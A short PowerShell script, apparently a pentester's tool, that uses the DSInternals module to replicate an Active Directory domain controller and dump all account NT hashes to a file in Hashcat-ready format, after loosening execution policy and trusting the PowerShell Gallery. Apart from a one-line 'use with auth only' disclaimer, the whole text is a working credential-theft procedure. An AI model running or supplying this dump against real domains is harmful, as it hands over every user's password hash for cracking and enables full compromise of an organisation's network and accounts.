#Replicate Active Directory - nEeds Doma1n Adm1n Cr3dz to steal all teh hashes
# mRr3b00t 
# use hax for good -defend all the things - use with auth only and don't be a dick!

$domain = "pwnlab.local"
$username = "administrator"
$server = "VULN-DC02"

Set-ExecutionPolicy -ExecutionPolicy Unrestricted
Set-PSRepository -Name 'PSGallery' -InstallationPolicy Trusted

Install-Module -Name DSInternals

$creds = Get-Credential

Get-ADReplAccount -All -Credential $creds -Server $server -Protocol TCP | Format-Custom -View HashcatNT | Out-File hashes.txt -Encoding utf8

#replicate a single account
Get-ADReplAccount -SamAccountName $username -Domain $domain -Server $server -Credential $creds -Protocol TCP
